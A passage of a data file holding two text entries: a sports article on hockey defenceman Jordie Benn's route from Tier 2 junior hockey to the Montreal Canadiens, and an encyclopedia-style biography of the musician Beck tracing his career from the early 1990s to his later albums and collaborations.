  "latent_4417": "Defenceman Jordie Benn has been a pleasant surprise for the Canadiens since being acquired from the Dallas Stars on Feb. 27 in exchange for Greg Pateryn and a fourth-round pick at this year’s NHL Draft.\n\nThe fact Benn even made it to the NHL is also a surprise.\n\nBenn never played major-junior hockey or at the U.S. college level. Instead, the British Columbia native spent four years playing Tier 2 junior hockey in his home town of Victoria and wasn’t selected at the NHL Draft.\n\n“I got a scholarship to (the University of) Alaska Fairbanks when I was 17,” Benn recalled after the Canadiens’ 4-1 win over the Ottawa Senators Sunday night at the Bell Centre. “I felt I committed too early … should have played my 18-, 19-year-old year and then committed. But it is what it is. I just decided not to go to school … didn’t really want to go to Fairbanks and live up there.\n\n“When I was getting 19, 20, I had a couple of teams come and ask me if I wanted to come play in the WHL,” Benn added. “I just figured there’s no real point when I’m 19, 20 years old to go there and have one or two years (of major junior) and you never know what can happen, right? I thought, if nothing else, I’d go to school and then have four more years of experience. But it didn’t work like that and I just went to the East Coast and worked my way up.”\n\nAfter his junior career ended in the BCHL, Benn stayed in Victoria and played one season for the ECHL’s Salmon Kings, followed by a year with the CHL’s Allen Americans (Texas) and two seasons with the AHL’s Texas Stars before making his NHL debut with Dallas during the 2011-12 season.\n\nBenn said being able to play in Victoria and live at home was “awesome.”\n\n“Being a kid, you’ve got nothing to worry about living at the parents’ house, playing junior hockey,” the 29-year-old said. “It was some of the funnest times of my life. Just a cool experience.”\n\nOne of Benn’s coaches in Victoria was former NHL player Geoff Courtnall, who is also from Victoria. Benn’s best friend is Courtnall’s son, Justin, who played for the Canadiens’ AHL farm team in Hamilton during the 2013-14 season. Benn and Courtnall were teammates for one season with the Tier 2 Victoria Grizzlies before Justin went to Boston University.\n\n“Me and him talk close to every day,” Benn said about Justin, who is the nephew of former Canadien Russ Courtnall. “He’s a very smart kid, so he gave me some kind words when I came here. He knew a few of the guys from playing in the American league with them.”\n\nBenn described his road to the NHL as a roller-coaster, but it has been a smooth ride so far with the Canadiens. The 6-foot-2, 200-pounder has played solid defence, becoming a fixture on the No. 3 pairing during his first nine games, averaging 17:16 of ice time and posting an even plus/minus rating. He has also contributed two goals, including one Sunday against the Senators.\n\n“That first day was a little shocking,” Benn said about the trade. “The first thing I asked was where was I going, and they said Montreal. Who wouldn’t be ecstatic to come play for the Montreal Canadiens? It’s a big honour and I’m excited to be here. The guys have been great and we’ve been playing well.”\n\nThe Canadiens had a day off Monday before facing the Detroit Red Wings Tuesday night at the Bell Centre (7:30 p.m., RSE, RDS, TSN Radio 690). Sunday’s win over Ottawa moved the Canadiens four points ahead of the Senators atop the Atlantic Division standings and Montreal’s next five games are all at home. The Canadiens have 10 games remaining in the regular season and next Saturday’s rematch with the Senators at the Bell Centre is the only one against a team currently in a playoff position.\n\nThings are looking good for the Canadiens, who are 10-4-0 since Claude Julien took over from Michel Therrien as head coach. After Sunday’s win, Julien talked about how excited Benn was when he arrived in Montreal, along with his great personality and sense of humour, which have fit in well with his new teammates. The coach added he likes the way Benn — with his big, bushy beard and sleeve tattoo — knows when it’s time to work and when it’s time to have fun and enjoy life. Julien also likes how patient Benn is with the puck, making good decisions while playing solid defensively.\n\nBenn has two more seasons remaining on a three-year, US$3.3-million contract.\n\n“The guys in here are awesome,” Benn said about his new teammates. “It’s an easy transition. I talked with Weby (Shea Weber, who is also from B.C.) before I got here and these guys have been great. Just come in here and play my game.”\n\nJust like he did in Tier 2 junior hockey.\n\nscowan@postmedia.com\n\ntwitter.com/StuCowan1",

  "latent_4490": "This article is about the American singer. For other uses, see Beck (disambiguation)\n\nBeck Hansen (born Bek David Campbell; July 8, 1970), better known by his stage name Beck, is an American musician, singer, songwriter, rapper, record producer, and multi-instrumentalist. He rose to fame in the early 1990s with his experimental and lo-fi style, and became known for creating musical collages of wide genre styles. Today, he musically encompasses folk, funk, soul, hip hop, electronic, alternative rock, country, and psychedelia. He has released 13 studio albums (3 of which were independently released), as well as several non-album singles and a book of sheet music.\n\nBorn in Los Angeles in 1970, Beck grew towards hip-hop and folk in his teens and began to perform locally at coffeehouses and clubs. He moved to New York City in 1989 and became involved in the city's small and fiery anti-folk movement. Returning to Los Angeles in the early 1990s, he cut his breakthrough single \"Loser,\" which became a worldwide hit in 1994, and released his first major album, Mellow Gold, the same year. Odelay, released in 1996, topped critic polls and won several awards. He released the psychedelic Mutations in 1998, and the funk-infused Midnite Vultures in 1999. The soft-acoustic Sea Change in 2002 showcased a more serious Beck, and 2005's Guero returned to Odelay's sample-based production. The Information in 2006 was inspired by electro-funk, hip hop, and psychedelia; 2008's Modern Guilt was inspired by '60s pop music; and 2014's folk-infused Morning Phase won Album of the Year at the 57th Grammy Awards on February 8, 2015. His thirteenth studio album, Colors, was released in October 2017 after a long production process, and won awards for Best Alternative Album and Best Engineered Album at the 61st Annual Grammy Awards.\n\nWith a pop art collage of musical styles, oblique and ironic lyrics, and postmodern arrangements incorporating samples, drum machines, live instrumentation and sound effects, Beck has been hailed by critics and the public throughout his musical career as being among the most idiosyncratically creative musicians of 1990s and 2000s alternative rock. Two of Beck's most popular and acclaimed recordings are Odelay and Sea Change, both of which were ranked on Rolling Stone's list of the 500 greatest albums of all time. The four-time platinum artist has collaborated with several artists and has made several contributions to soundtracks.\n\nEarly life [ edit ]\n\nBeck was born Bek David Campbell[2][3] in Los Angeles, California, on July 8, 1970.[4] His father, Canadian arranger, composer, and conductor David Campbell, worked on hundreds of albums and numerous films.[5] His mother, American visual artist Bibbe Hansen, grew up amid New York's Andy Warhol Factory art scene of the 1960s, where she was a Warhol superstar,[5] but moved to California at age 17, where she met Beck's father.[6] Bibbe's maternal grandmother was Jewish, while her father, artist Al Hansen, was of Norwegian descent[7][8] and was a pioneer in the avant-garde Fluxus movement.[5] Beck has said that he was \"raised celebrating Jewish holidays\" and that he considers himself Jewish.[9]\n\nBeck began life in a rooming house near downtown Los Angeles. As a child, he lived in a declining neighborhood near Hollywood Boulevard.[10] He later recalled, \"By the time we left there, they were ripping out miles of houses en masse and building low-rent, giant apartment blocks.\"[6] The lower-class family struggled financially, moving to Hoover and Ninth Street, a neighborhood populated primarily by Koreans and Salvadorian refugees.[6] He was sent for a time to live with his paternal grandparents in Kansas, later remarking that he thought \"they were kind of concerned\" about his \"weird\" home life.[11] Since his paternal grandfather was a Presbyterian minister, Beck grew up influenced by church music and hymns.[11] He also spent time in Europe with his maternal grandfather.[5]\n\nAfter his parents separated when he was 10,[6] Beck stayed with his mother and brother Channing in Los Angeles, where he was influenced by the city's diverse musical offerings—everything from hip hop to Latin music and his mother's art scene—all of which would later reappear in his work.[citation needed] Beck obtained his first guitar at 16 and became a street musician, often playing Lead Belly covers at Lafayette Park.[12] During his teens, Beck discovered the music of Sonic Youth, Pussy Galore, and X, but remained uninterested in most music outside the folk genre until many years into his career.[5][6] The first contemporary music that made a direct connection with Beck was hip hop, which he first heard on Grandmaster Flash records in the early 1980s.[6] Growing up in a predominantly Latin district, he found himself the only white child at his school, and quickly learned how to breakdance.[6] When he was 17, Beck grew fascinated after hearing a Mississippi John Hurt record at a friend's house,[13] and spent hours in his room trying to emulate Hurt's finger picking techniques.[11] Shortly thereafter, Beck explored blues and folk music further, discovering Woody Guthrie and Blind Willie Johnson.[13]\n\nFeeling like \"a total outcast\", Beck dropped out of school after junior high.[13] He later said that although he felt school was important, he felt unsafe there.[10] When he applied to the new performing arts high school downtown, he was rejected.[14] His brother took him to post-Beat jazz places in Echo Park and Silver Lake. He hung out at the Los Angeles City College, perusing records, books and old sheet music in its library. He used a fake I.D. to sit in on classes there, and he also befriended a literature instructor and his poet wife.[14] He worked at a string of menial jobs, including loading trucks and operating a leaf blower.[13]\n\nCareer [ edit ]\n\nEarly performing and first releases (1988–93) [ edit ]\n\nBeck began as a folk musician, switching between country blues, Delta blues and more traditional rural folk music in his teens.[6] He began performing on city buses, often covering Mississippi John Hurt alongside original, sometimes improvisational compositions.[11] \"I'd get on the bus and start playing Mississippi John Hurt with totally improvised lyrics. Some drunk would start yelling at me, calling me Axl Rose. So I'd start singing about Axl Rose and the levee and bus passes and strychnine, mixing the whole thing up,\" he later recalled.[11] He was also in a band called Youthless that hosted Dadaist-inspired freeform events at city coffee shops.[6] \"We had Radio Shack mics and this homemade speaker and we'd draft people in the audience to recite comic books or do a beatbox thing, or we'd tie the whole audience up in masking tape,\" Beck recalled.[6]\n\nIn 1989, Beck caught a bus to New York City with little more than eight dollars and a guitar.[11] He spent the summer attempting to find a job and a place to live with little success.[11] Beck eventually began to frequent Manhattan's Lower East Side and stumbled upon the tail end of the East Village's anti-folk scene's first wave.[5] Beck became involved in a loose posse of acoustic musicians—including Cindy Lee Berryhill, Kirk Kelly, Paleface, and Lach, headed by Roger Manning—whose raggedness and eccentricity placed them well outside the acoustic mainstream.[13][15] \"The whole mission was to destroy all the clichés and make up some new ones,\" said Beck of his New York years. \"Everybody knew each other. You could go up onstage and say anything, and you wouldn't feel weird or feel any pressure.\"[15] Inspired by that freedom and by the local spoken-word performers, Beck began to write free-associative, surrealistic songs about pizza, MTV, and working at McDonald's, turning mundane thoughts into songs.[15] Beck was roommates with Paleface, sleeping on his couch and attending open mic nights together.[16] Daunted by the prospect of another homeless New York winter, Beck returned to his home of Los Angeles in early 1991.[13][17] \"I was tired of being cold, tired of getting beat up,\" he later remarked. \"It was hard to be in New York with no money, no place[....] I kinda used up all the friends I had. Everyone on the scene got sick of me.\"[11]\n\nBack in Los Angeles, Beck began to work at a video store in Silver Lake \"doing things like alphabetizing the pornography section\".[11] He began performing in arthouse clubs and coffeehouses such as Al's Bar and Raji's.[5][11][13] In order to keep indifferent audiences engaged in his music, Beck would play in a spontaneous, joking manner.[18] \"I'd be banging away on a Son House tune and the whole audience would be talking. So maybe out of desperation or boredom, or the audience's boredom, I'd make up these ridiculous songs just to see if people were listening,\" he later remarked.[19] Virtually an unknown to the public and an enigma to those who met him, Beck would hop onstage between acts in local clubs and play \"strange folk songs\", accompanied by \"what could best be described as performance art\" while sometimes wearing a Star Wars stormtrooper mask.[13] Beck met someone who offered to help record demos in his living room, and he began to pass cassette tapes around.[13]\n\nEventually, Beck gained key boosters in Margaret Mittleman, the West Coast's director of talent acquisitions for BMG Music Publishing, and the partners behind independent record label Bong Load Custom Records: Tom Rothrock, Rob Schnapf and Brad Lambert.[5] Schnapf saw Beck perform at Jabberjaw and felt he would suit their small venture.[13] Beck expressed a loose interest in hip hop, and Rothrock introduced him to Carl Stephenson, a record producer for Rap-A-Lot Records.[13][20] In 1992, Beck visited Stephenson's home to collaborate. The result—the slide-sampling hip hop track \"Loser\"—was a one-off experiment that Beck set aside, going back to his folk songs, making his home tapes such as Golden Feelings, and releasing several independent singles.[13]\n\nMellow Gold, and independent albums (1993–94) [ edit ]\n\nBy 1993, Beck was living in a rat-infested shed near a Los Angeles alleyway with little money.[11] Bong Load issued \"Loser\" as a single in March 1993 on 12\" vinyl with only 500 copies pressed.[21] Beck felt that \"Loser\" was mediocre, and only agreed to its release at Rothrock's insistence.[22] \"Loser\" unexpectedly received radio airplay, starting in Los Angeles, where college radio station KXLU was the first to play it,[21] and later on Santa Monica College radio station KCRW, where radio host Chris Douridas played the song on Morning Becomes Eclectic, the station's flagship music program. \"I called the record label that day and asked to have Beck play live on the air,\" Douridas said. \"He came in that Friday, rapped to a tape of \"Loser\" and did his song 'MTV Makes Me Want to Smoke Crack.'\"[13] That night, Beck performed at the Los Angeles club Cafe Troy to a packed audience and talent scouts from major labels.[13] The song then spread to Seattle through KNDD, and KROQ-FM began playing the song on an almost hourly basis.[21] As Bong Load struggled to press more copies of \"Loser\", Beck was beset with offers to sign with major labels.[23] During the bidding war in November, Beck spent several days in Olympia, Washington, recording material with Calvin Johnson of Beat Happening, which would later see release the following year on Johnson's K Records as One Foot in the Grave.[24]\n\nA fierce bidding war ensued, with Geffen Records A&R director Mark Kates signing Beck in December 1993 despite intense competition from Warner Bros. and Capitol.[13][24] Beck's non-exclusive contract with Geffen allowed him an unusual amount of creative freedom, with Beck remaining free to release material through such small, independent labels as Flipside, which issued the sprawling, 25-track collection of pre-\"Loser\" recordings titled Stereopathetic Soulmanure on February 22 the following year.[13][24] By the time Beck released his first album for Geffen, the low-budget, genre-blending Mellow Gold on March 1,[13] \"Loser\" was already in the top 40 and its video in MTV's Buzz Bin.[10] \"Loser\" quickly ascended the charts in the U.S., reaching a peak of number ten on the Billboard Hot 100 singles chart and topping the Modern Rock Tracks chart.[25] The song also charted in the UK, Australia, New Zealand, and throughout Europe. Beck's newfound position of attention led to his characterization as the \"King of Slackers\", as the media dubbed him the center of the new so-called \"slacker\" movement.[26] Critics, feeling it the essential follow-up to Radiohead's \"Creep\",[24] found vacantness in the lyrics of \"Loser\" strongly associated with Generation X, although Beck himself strongly contested his position as the face of the \"slacker\" generation: \"Slacker my ass. I mean, I never had any slack. I was working a $4-an-hour job trying to stay alive. That slacker stuff is for people who have the time to be depressed about everything.\"[11]\n\nBacklash and Odelay (1994–97) [ edit ]\n\nFeeling as though he were \"constantly trying to prove myself\",[10] Beck suffered a backlash, with skeptics denouncing him as a self-indulgent fake and the latest marketing opportunity.[27] In the summer of 1994, Beck was struggling and many of his fellow musicians thought he had lost his way.[6] Combined with the song's wildly popular music video and the world tour, Beck reacted believing the attention could not last, resulting in a status as a \"one-hit wonder\". At other concerts, crowds were treated to twenty minutes of reggae or Miles Davis or jazz-punk iterations of \"Loser\".[14] At one-day festivals in California, he surrounded himself with an artnoise combo. The drummer set fire to his cymbals; the lead guitarist \"played\" his guitar with the strings faced towards his body; and Beck changed the words to \"Loser\" so that nobody could sing along.[6] \"I can't tell you how many times I was looking at faces that were looking back at me with complete bewilderment—or just pointing and shaking their heads and laughing—while performing during that period,\" he later recalled.[28] Despite this, Beck gained the respect of his peers, such as Tom Petty and Johnny Cash, and created an entire wave of bands determined to recapture the Mellow Gold sound.[29] Feeling his previous releases were just collections of demos recorded over the course of several years, Beck desired to enter the studio and record an album in a continuous linear fashion, which became Odelay.[28]\n\nBeck blends country, blues, rap, jazz and rock on Odelay, the result of a year and half of feverish \"cutting, pasting, layering, dubbing, and, of course, sampling\".[12] Each day, the musicians started from scratch,[30] often working on songs for 16 hours straight.[12] Odelay's conception lies in an unfinished studio album Beck first embarked on following the success of \"Loser\", chronicling the difficult time he experienced: \"There was a cycle of everyone dying around me,\" he recalled later.[29] He was constantly recording, and eventually put together an album of somber, orchestrated folk tunes; one that, perhaps, \"could have been a commercial blockbuster along with similarly themed work by Smashing Pumpkins, Nine Inch Nails and Nirvana\".[29] Instead, Beck plucked one song from it—the Odelay album closer \"Ramshackle\"—and shelved the rest (\"Brother\" and \"Feather In Your Cap\" were however later released as B-Sides).[6][29] Beck was introduced to the Dust Brothers, producers of the Beastie Boys' album Paul's Boutique, whose cut-and-paste, sample-heavy production suited Beck's vision of a more fun, accessible album.[citation needed] After a record executive explained that Odelay would be a \"huge mistake\", he spent many months thinking \"that I'd blown it forever\".[14]\n\nOdelay was released on June 18, 1996, to commercial success and critical acclaim. The record produced several hit singles, including \"Where It's At\", \"Devils Haircut\", and \"The New Pollution\",[31] and was nominated for the Grammy Award for Album of the Year in 1997, winning a Grammy Award for Best Alternative Music Album as well as a Grammy Award for Best Male Rock Vocal Performance for \"Where It's At\". During one busy week in January 1997, he landed his Grammy nominations, appeared on Saturday Night Live and Howard Stern, and did a last-minute trot on The Rosie O'Donnell Show. The combined buzz gave Odelay a second wind, leading to an expanded fan base and additional exposure.[19] Beck enjoyed but, like several executives at Geffen, was bewildered by the success of Odelay. He would often get recognized in public, which made him feel strange. \"It's just weird. It doesn't feel right. It doesn't feel natural to me. I don't think I was made for that. I was never good at that,\" he later told Pitchfork.[28] Odelay sold two million copies and put \"one-hit wonder\" criticisms to rest. During this time, he contributed the song \"Deadweight\" to the soundtrack of the film A Life Less Ordinary (1997).[32]\n\nMutations and Midnite Vultures (1998–2001) [ edit ]\n\nHaving not been in a proper studio since \"Deadweight\", Beck felt anxious to \"go in and just do some stuff real quick\", and compiled several songs he had had for years.[32] Beck and his bandmates hammered out fourteen songs in fourteen days, although just twelve made it onto the album, 1998's Mutations.[32] Beck decided on Nigel Godrich, producer for Radiohead's OK Computer the previous year, to be behind the boards for the project.[32] Godrich was leaving the United States for England in a short time, which led to the album's quick production schedule—\"No looking back, no doctoring anything\".[32] The whole point of the record was to capture the performance of the musicians live, an uncharacteristic far-cry from the cut-and-paste aesthetic of Odelay.[32] Though the album was originally slated for release by Bong Load Records, Geffen intervened and issued the record against Beck's wishes.[33][34] The artist then sought to void his contracts with both record labels, and in turn the labels sued him for breach of contract. The litigation went on for years and it remains unclear to this day if it has ever been completely resolved.[35] Beck was later awarded Best Alternative Music Performance for Mutations at the 42nd Grammy Awards.[36]\n\nMidnite Vultures, Beck's next studio effort, was originally recorded as a double album, and more than 25 nearly completed songs were left behind.[28] In the studio, Beck and producers studied contemporary hip hop and R&B, specifically R. Kelly, in order to embrace and incorporate those influences in the way Al Green and Stax records had done in previous decades.[28] In July 1998, a core group began to assemble at Beck's Pasadena home: bassist Justin Meldal-Johnsen, keyboardist Roger Joseph Manning Jr., and producer-engineers Mickey Petralia and Tony Hoffer.[30] Dozens of session players passed through, including Beck's father, David Campbell, who played viola and arranged some of the strings. The musicians held communal meals and mountain-bike rides on dusty trails nearby, but remained focused on Beck's instructions: to make an up-tempo album that would be fun to play on tour night after night.[30] \"I had so many things going on\", said Beck of the recording process. \"I had a couple of rooms of computers hooked up, I was doing B sides for Japan, I was programming beats in one room and someone would be cooking dinner in the other room.\"[30] In November 1999, Geffen released the much-anticipated Midnite Vultures,[37] which attracted confusion: \"fans and critics misguidedly worried whether it was serious or a goof,\" and as a result, The New York Times wrote that the album \"never won the audience it deserved\".[38] The record was supported by an extensive world tour. For Beck, it was a return to the high-energy performances that had been his trademark as far back as Lollapalooza. The live stage set included a red bed that descended from the ceiling for the song \"Debra\", and the touring band was complemented by a brass section.[39] Midnite Vultures was nominated for Best Album at the 43rd Annual Grammy Awards.[40]\n\nSea Change (2002–03) [ edit ]\n\nIn 2000, Beck and his fiancée, stylist Leigh Limon, ended their nine-year relationship.[41] Beck lapsed into a period of melancholy and introspection, during which he wrote the bleak, acoustic-based tracks later found on Sea Change.[42] Beck sat on the songs, not wanting to talk about his personal life; he later said that he wanted to focus on music and \"not really strew my baggage across the public lobby\". Eventually, however, he decided the songs spoke to a common experience (a relationship breakup), and that it would not seem self-indulgent to record them.[43] In 2001, Beck drifted back to the songs and called producer Nigel Godrich.[44]\n\nRetailers initially predicted that the album would not receive much radio support, but they also believed that Beck's maverick reputation and critical acclaim, in addition to the possibility of multiple Grammy nominations, might offset Sea Change's noncommercial sound.[43] Sea Change, issued by Geffen in September 2002, was regardless a commercial hit and critical darling,[38] with Rolling Stone revering it as \"the best album Beck has ever made, [...] an impeccable album of truth and light from the end of love. This is his Blood on the Tracks.\"[45] The album was later listed by the magazine as one of the best records of the decade and of all-time, and it also placed second on the year's Pazz & Jop Critics Poll. Sea Change yielded a low-key, theater-based acoustic tour, as well as a larger tour with The Flaming Lips as Beck's opening and backing band.[46][47] Beck was playful and energetic, sometimes throwing in covers of The Rolling Stones, Big Star, The Zombies and The Velvet Underground.[45][48]\n\nFollowing the release of Sea Change, Beck felt newer compositions were sketches for something more evolved in the same direction, and wrote nearly 35 more songs in the coming months, keeping demos of them on tapes in a suitcase.[28] During his solo tour, the tapes were left backstage during a stop in Washington, D.C., and Beck was never able to recover them. It was disheartening to the musician, who felt the two years of songwriting represented something more technically complex. As a result, Beck took a break and wrote no original compositions in 2003.[28] Feeling as though it might take him a while to \"get back to that [songwriting] territory\", he entered the studio with Dust Brothers to complete a project that dated back to Odelay. Nearly half of the songs had existed since the 1990s.[28]\n\nGuero and The Information (2004–07) [ edit ]\n\nGuero, Beck's eighth studio album, was recorded over the span of nine months during which several significant events occurred in his life: his girlfriend, Marissa Ribisi, became pregnant; they were married; their son, Cosimo, was born; and they moved out of Silver Lake.[38][49] The collaboration with the Dust Brothers, his second, was notable for their use of high-tech measures to achieve a lo-fi sound.[38] For example, after recording a \"sonically perfect\" version of a song at one of the nicest recording studios in Hollywood, the Dust Brothers processed it in an Echoplex to create a gritty, reverb-heavy sound: \"We did this high-tech recording and ran it through a transistor radio. It sounded too good, that was the problem.\"[38] Initially due to be released in October 2004, Guero faced delays and did not come out till March 2005, though unmastered copies of the tracks surfaced online in January.[50]\n\nBeck in 2005\n\nGuero debuted at number two on the Billboard 200, selling 162,000 copies, an all-time sales high.[51] Lead single \"E-Pro\" peaked at number one at Modern Rock radio, making it his first chart-topper since \"Loser\".[52] Beck, inspired by the Nintendocore remix scene and feeling a connection with its lo-fi, home-recording method, collaborated with artists 8-Bit and Paza on Hell Yes, an EP issued in February 2005.[49] In December 2005, Geffen also issued Guerolito, a fully reworked version of Guero featuring remixes by the Beastie Boys' Ad-Rock, the Dust Brothers' John King and Scottish electronic duo Boards of Canada.[49] Guerolito combines remixes previously heard as B-sides and new versions of album tracks to make a track-by-track reconfiguration of the album.[49] Also released in 2005 was A Brief Overview, a 12-track promotional-only \"History of Beck\" compilation CD sampler that featured a combination of older and newer Beck tracks.[53]\n\nBeck in 2006\n\nThe Information, Beck's ninth studio album, began production around the same time as Guero, in 2003. Working with producer Nigel Godrich, Beck built a studio in his garden, where they wrote many of the tracks.[54] \"The idea was to get people in a room together recording live, hitting bad notes and screaming,\" said Beck, adding that the album is best described as \"introspective hip hop\".[55] Beck described the recording process as \"painful\", noting that he edited down songs constantly and he perhaps recorded the album three times.[56] For the release, Beck was allowed for the first time to fulfill a long-running wish for an unconventional rollout: he made low-budget videos to accompany each song, packaged the CD with sheets of stickers so buyers could customize the cover, and leaked tracks and videos on his website months ahead of the album's release.[54][57] Digital download releases automatically downloaded the song's additional video for each single sale, and physical copies came bundled with an additional DVD featuring fifteen videos.[54]\n\nModern Guilt (2008) [ edit ]\n\nIn 2007, Beck released the single \"Timebomb\", which was nominated for a Grammy Award for Best Solo Rock Vocal Performance.[58] For his next studio effort, his tenth, Beck tapped Danger Mouse to produce, and the two first met in December 2007 to record. The duo knocked out two tracks in two days, but the notion that the album would be finished in a timely fashion soon evaporated.[58] Beck had known Danger Mouse casually before, as many of his former musicians ended up working with Danger Mouse's side project, Gnarls Barkley. Still, the musicians were surprised at how well they got along.[59] Following the grueling recording schedule, Beck was exhausted, calling it \"the most intense work I've ever done on anything\", relating that he \"did at least 10 weeks with no days off, until four or five in the morning every night.\"[59] Beck's original vision was a short 10-track burst with two-minute songs, but the songs gradually grew as he fit 'two years of songwriting into two and a half months.\"[59] Modern Guilt (2008) was \"full of off-kilter rhythms and left-field breakdowns, with an overall 1960s vibe.\"\n\nRecord Club, Song Reader, production work and non-album singles (2009–13) [ edit ]\n\nModern Guilt was the final release in Beck's contract with Geffen Records. Beck, then 38, had held the contract since his early 20s.[58][59] Released from his label contract and going independent, Beck began working more heavily on his own seven-year-old label, which went through a variety of names.[28] His focus on smaller, more quixotic projects,[14] Beck moonlighted as a producer, working with artists such as Charlotte Gainsbourg, Thurston Moore and Stephen Malkmus.[28] Beck worked for five or six days a week at the small studio on his property in Malibu, and founded Record Club, a project whereby an entire classic album—by The Velvet Underground, Leonard Cohen, INXS, Yanni—would be covered by another singer in the span of a single day.[14] Beck provided four songs for the film Scott Pilgrim vs. the World (2010), each attributed to the title character's fictional band, Sex Bob-Omb.[60] Beck also collaborated with Philip Glass,[61] Jack White,[62] Tobacco of Black Moth Super Rainbow,[63] Jamie Lidell,[64] Seu Jorge,[65] Childish Gambino,[66] and The Lonely Island.[67]\n\nSong Reader, a project Beck released in December 2012, is 20 songs presented only as sheet music, in the hopes that enterprising musicians will record their own versions.[68] The idea of Song Reader came about nearly fifteen years prior, shortly after the release of Odelay.[14] When sent a book of transcribed sheet music for that album, Beck decided to play through it and grew interested in the world before recorded sound. He aimed to keep the arrangements as open as possible, to re-create the simplicity of the standards, and became preoccupied with creating only pieces that could fit within the Great American Songbook.[14] In 2013 Beck began playing special Song Reader concerts with a variety of guests and announced he was working on a record of Song Reader material with other musicians as well as possibly a compilation of fan versions.[69]\n\nBeck performing in 2013\n\nIn the summer of 2013, Beck was reported to be working on two new studio albums: one a more self-contained acoustic disc in the vein of One Foot in the Grave and another described as a \"proper follow-up\" to Modern Guilt.[70] Beck expected to release both albums independently, and released two standalone singles over the course of the summer: the electro ballad \"Defriended\" and the chorus-heavy \"I Won't Be Long\".[70][71] A third single, \"Gimme\", appeared on September 17.[72]\n\nMorning Phase and Colors (2014–present) [ edit ]\n\nIn October 2013, it was announced that Beck signed to Capitol Records. On January 20, 2014, Beck released the track \"Blue Moon\", which was to be the lead single for his twelfth studio album, Morning Phase.[73] On February 4, second single \"Waking Light\" was released, just prior to the official release of Morning Phase on February 21, 2014.[74][75][76] For the recording of the album, Beck reunited with many of the same musicians with whom he had worked on the critically acclaimed 2002 album Sea Change, and likely because of this, it has been noted that the two albums have a similar genre.[77]\n\nOn February 8, 2015, at the 57th Annual Grammy Awards, Morning Phase won three Grammys: Best Engineered Album, Non-Classical; Best Rock Album; and Album of the Year.[78] Upon receiving the Album of the Year award, the album beat out Pharrell Williams's G I R L, Beyoncé's self-titled album, Sam Smith's In the Lonely Hour, and Ed Sheeran's x.[79]\n\nIn the time after Morning Phase's release and general critical success, Beck mentioned that he had been working on another album at around the same time, but that the new album would be more of a pop record. Shortly after Morning Phase's Grammy wins, on June 15, 2015, Beck released the first single titled \"Dreams\" off this upcoming thirteenth studio album. \"I was really trying to make something that would be good to play live,\" he said shortly after its release.[80] However, no further word was heard from Beck pertaining to the release of the album. On June 2, 2016, almost a year after the initial release of \"Dreams,\" Beck released a new single titled \"Wow\", along with a lyric video of the song and an announcement that his still untitled album would be released on October 21, 2016.[81] In September 2016, the album was delayed with no new release date announced and, on September 24, Beck said he didn't know \"when it's coming out. It's probably in a few months.\"[82] Once again, however, no further singles were released and no new release date was scheduled for the album.\n\nOn August 11, 2017, Beck announced that his thirteenth studio album would be titled Colors and would be released on October 13.[83] Several songs were confirmed to appear on the album, including \"Dreams,\" \"Wow,\" and a track titled \"Up All Night\" that had been previously included on the FIFA 17 soundtrack.[84] On September 8, 2017, Beck released the single \"Dear Life,\" which was quickly followed up with the official release of \"Up All Night\" on September 18.[85][84] Colors was released on October 13, 2017. It was recorded at co-executive producer Greg Kurstin's Los Angeles studio, with Beck and Kurstin playing nearly every instrument themselves.[83] The experimental pop-fused record received generally positive reviews from critics.[86] On July 18, 2018, Beck performed the title track Colors, and the first single \"Wow\" on The Late Show with Stephen Colbert.[87]\n\nCollaborations and contributions [ edit ]\n\nIn 1999, Beck contributed to a tribute album for Bruce Haack and Esther Nelson and their label Dimension 5 Records. The album, Dimension Mix, released in 2005, was a benefit for Cure Autism Now that was produced by Ross Harris, an early collaborator who designed the artwork for Mellow Gold.\n\nOn June 20, 2009, Beck announced that he was starting an experiment called Record Club, in which he and other musicians would record cover versions of entire albums in one day. The first album covered by Beck's Record Club was The Velvet Underground & Nico. Starting on June 18, the club began posting covers of songs from the album on Thursday evenings, each with its own video.[88] On September 4, 2009, Beck announced the second Record Club album, Songs of Leonard Cohen. Contributors included MGMT, Devendra Banhart, Andrew Stockdale of Wolfmother and Binki Shapiro of Little Joy.[89] In the third Record Club venture, Wilco, Feist, Jamie Lidell and James Gadson joined Beck to cover Skip Spence's Oar. The first song, \"Little Hands\", was posted on Beck's website on November 12, 2009.[90] The Record Club has since covered albums by INXS and Yanni.\n\nOn June 19, 2009, Beck announced Planned Obsolescence, a weekly DJ set put together by Beck or guest DJs. Soon after, on July 7, Beck announced that his website would be featuring \"extended informal conversations with musicians, artists, filmmakers, and other various persons\" in a section called Irrelevant Topics. Then, on July 12, he added a section called Videotheque, which he said would contain \"promotional videos from each album, as well as live clips, TV show appearances and other rarities\". Also in 2009, Beck collaborated with Charlotte Gainsbourg on her album IRM, which was released in January 2010. Beck wrote the music, co-wrote the lyrics, and produced and mixed the album. The lead single, \"Heaven Can Wait\", is a duet by Beck and Gainsbourg.[91]\n\nIn late February 2010, it was announced that electronic artist Tobacco of Black Moth Super Rainbow had collaborated with Beck on two songs, \"Fresh Hex\" and \"Grape Aerosmith\", on his upcoming album Maniac Meat. Tobacco revealed that in making the album, Beck sent the vocal parts to him, and that they had never actually met.[citation needed] In March 2010, Beck revealed that he had produced songs for the new Jamie Lidell album, Compass.[92] In the summer of 2010, Beck contributed songs to both The Twilight Saga: Eclipse soundtrack, with \"Let's Get Lost\" (a duet with Bat for Lashes),[93] and True Blood (HBO Original Series Soundtrack, Vol. 2), with \"Bad Blood\".[94] He also contributed songs to the soundtrack of Edgar Wright's film Scott Pilgrim vs. the World, which was released in August 2010.[95]\n\nIn 2011, he collaborated with Seu Jorge on a track titled \"Tropicália (Mario C. 2011 Remix)\" for the Red Hot Organization's most recent charitable album Red Hot+Rio 2, a follow-up to the 1996 album Red Hot + Rio. Proceeds from the sales will be donated to raise awareness and money to fight AIDS/HIV and related health and social issues.[96] He also contributed on the song \"Attracted to Us\" on Turtleneck & Chain, the second album from The Lonely Island. Also in 2011, Beck produced a solo album by Thurston Moore of Sonic Youth called Demolished Thoughts. An album he produced for Stephen Malkmus and the Jicks, Mirror Traffic, was released in August 2011.\n\nIn October 2011, it was widely reported that Beck and producer Hector Castillo were collaborating with American composer Philip Glass to produce a remix album of the composer's works in honor of his 75th birthday.[97][98][99][100] The album, Rework Philip Glass Remixed, was released on October 23, 2012, to critical acclaim, and featured Beck as both a curator and a performer.[101][102] In particular, Pitchfork described Beck's 22-minute contribution to the album, \"NYC: 73–78\", as \"a fantasia ... the most startling and original piece of music with Beck's name on it in a while, and the first new work to bear his own spirit in even longer.\"[103] Reflecting on Beck's contribution to the album, Glass remarked that he 